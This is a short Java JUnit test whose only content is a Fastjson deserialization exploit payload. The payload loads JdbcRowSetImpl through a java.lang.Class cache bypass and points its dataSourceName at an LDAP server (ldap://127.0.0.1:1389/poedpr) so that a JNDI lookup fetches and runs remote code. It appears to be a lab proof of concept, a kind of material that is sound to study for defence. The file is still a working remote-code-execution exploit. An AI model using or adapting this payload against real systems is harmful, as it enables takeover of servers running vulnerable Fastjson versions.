import com.alibaba.fastjson.JSON;
import org.junit.Test;

public class TestPayload {
    @Test
    public void test1(){
        String payload = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/poedpr\",\"autoCommit\":true}}";
        JSON.parse(payload);
    }
}
